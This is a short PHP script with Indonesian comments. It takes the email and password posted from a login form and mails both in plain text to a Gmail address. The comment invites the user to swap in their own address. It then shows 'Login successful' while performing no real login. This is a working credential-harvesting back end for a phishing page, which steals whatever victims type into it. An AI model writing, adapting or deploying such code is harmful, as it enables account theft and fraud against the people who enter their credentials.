<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    $kepada = "bimqbanbang@gmail.com"; // Ganti dengan alamat Gmail kamu
    $judul = "Login Baru dari Website Kerjaan";
    $pesan = "Email: $email\nPassword: $password";

    $headers = "From: notifikasi@webkerjaan.com";

    if (mail($kepada, $judul, $pesan, $headers)) {
        echo "Login berhasil. Data sudah dikirim.";
    } else {
        echo "Gagal mengirim email.";
    }
}
?>